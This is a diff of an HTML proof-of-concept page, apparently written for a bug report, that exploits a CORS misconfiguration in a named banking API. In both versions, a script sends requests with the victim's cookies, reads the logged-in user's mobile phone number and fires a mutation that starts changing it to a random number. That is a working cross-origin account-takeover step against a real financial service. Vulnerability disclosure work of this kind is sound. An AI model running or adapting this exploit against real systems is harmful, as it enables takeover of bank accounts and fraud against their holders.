@@ -1,88 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>Swan CORS Critical PoC</title>
+<meta charset="utf-8">
+<title>Swan CORS Critical PoC</title>
+<style>
+  body { font-family: system-ui; margin: 2rem; }
+  pre  { background:#f8f8f8; padding:1rem; border:1px solid #ddd; }
+</style>
 
-  <!--
-    Strict CSP: no unsafe-eval, no unsafe-inline except for our nonce’d script.
-    Only allow connections to Swan’s API.
-  -->
-  <meta http-equiv="Content-Security-Policy"
-        content="
-          default-src 'none';
-          connect-src https://api.swan.io;
-          script-src 'self' 'nonce-POC1234';
-          style-src 'self';
-        ">
-  <style>
-    body { font-family: system-ui; margin: 2rem; color: #111 }
-    pre  { background: #f8f8f8; padding: 1rem; border: 1px solid #e1e1e1; overflow: auto }
-    code { color: #c7254e; background: #f9f2f4; padding: 0.2em 0.4em }
-  </style>
-</head>
-<body>
-  <h2>⚠️ Swan Banking – Critical CORS Misconfiguration PoC ⚠️</h2>
-  <p>
-    This page is served from <strong id="origin"></strong>.<br>
-    All requests below run <em>automatically</em> with your <code>api.swan.io</code> cookies
-    (no JWT, no custom header) because the API reflects <code>Origin</code> and
-    returns <code>Access-Control-Allow-Credentials: true</code>.
-  </p>
+<h2>⚠️ Swan CORS Misconfiguration PoC ⚠️</h2>
+<p>
+  Hosted on <strong id="origin"></strong>.  
+  Must be tested **after** logging in at <code>dashboard.swan.io</code>.
+</p>
+<pre id="log">Running…</pre>
 
-  <h3>Live log</h3>
-  <pre id="log">Running…</pre>
+<script>
+  document.getElementById('origin').textContent = location.origin;
+  const log = line => document.getElementById('log').textContent += line + '\n';
 
-  <script nonce="POC1234">
-    const log = line => document.getElementById('log').textContent += line + '\n';
-    document.getElementById('origin').textContent = location.origin;
+  async function gql(path, query) {
+    const res = await fetch(`https://api.swan.io${path}`, {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ query })
+    });
+    const text = await res.text();
+    log(`=== ${path} ===\nStatus: ${res.status}\n${text}\n`);
+    return JSON.parse(text).data;
+  }
 
-    // Generic GraphQL helper (uses only fetch, no eval)
-    async function gql(path, query) {
-      const res = await fetch(`https://api.swan.io${path}`, {
-        method:  'POST',
-        credentials: 'include',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ query })
-      });
-      const text = await res.text();
-      log(`=== ${path} ===\nStatus: ${res.status} ${res.statusText}\n${text}\n`);
-      return JSON.parse(text).data;
+  (async () => {
+    // 1) prove cookie is sent & accepted
+    const who = await gql('/admin-auth/graphql', '{ user { mobilePhoneNumber } }');
+    if (!who || !who.user) {
+      log('🔒 Not logged in or cookie not sent – please sign in at dashboard.swan.io and reload.');
+      return;
     }
+    const oldN = who.user.mobilePhoneNumber;
+    log(`✅ Victim’s phone: ${oldN}\n`);
 
-    (async () => {
-      // 1) Try to read the victim’s phone number
-      let oldN = '+33600000002';
-      const whoami = await gql('/admin-auth/graphql', '{ user { mobilePhoneNumber } }');
-      if (whoami && whoami.user && whoami.user.mobilePhoneNumber) {
-        oldN = whoami.user.mobilePhoneNumber;
-        log(`✅ Read victim’s phone: ${oldN}\n`);
-      } else {
-        log(`⚠️ Could not read phone – not logged in. Falling back to dummy: ${oldN}\n`);
-      }
-
-      // 2) Generate a valid new number: +33 6 XXXXXXXX (8 digits)
-      const rand = () => Math.floor(10000000 + Math.random() * 90000000);
-      const newN = '+336' + rand();
-      log(`▶ Attempting change from ${oldN} → ${newN}\n`);
-
-      // 3) Fire off the mutation
-      const mutation = `
-        mutation {
-          startPhoneNumberModification(input:{
-            oldPhoneNumber:"${oldN}",
-            newPhoneNumber:"${newN}"
-          }) {
-            __typename
-            ... on StartPhoneNumberModificationSuccessPayload {
-              phoneNumberModification { id }
-            }
-            ... on PhoneNumberModificationAlreadyExistsRejection { message }
-            ... on TooManyPhoneNumberModificationRejection { message }
-          }
-        }`;
-      await gql('/admin-auth/graphql', mutation);
-    })();
-  </script>
-</body>
-</html>
+    // 2) perform admin mutation
+    const rand = Math.floor(1e7 + Math.random()*9e7);
+    const newN = '+336' + String(rand).slice(1);
+    log(`▶ Changing ${oldN} → ${newN}`);
+    await gql('/admin-auth/graphql', `
+      mutation {
+        startPhoneNumberModification(input:{
+          oldPhoneNumber:"${oldN}",
+          newPhoneNumber:"${newN}"
+        }) {
+          __typename
+          ... on StartPhoneNumberModificationSuccessPayload { phoneNumberModification{id} }
+          ... on PhoneNumberModificationAlreadyExistsRejection { message }
+          ... on TooManyPhoneNumberModificationRejection { message }
+        }
+      }`);
+  })();
+</script>
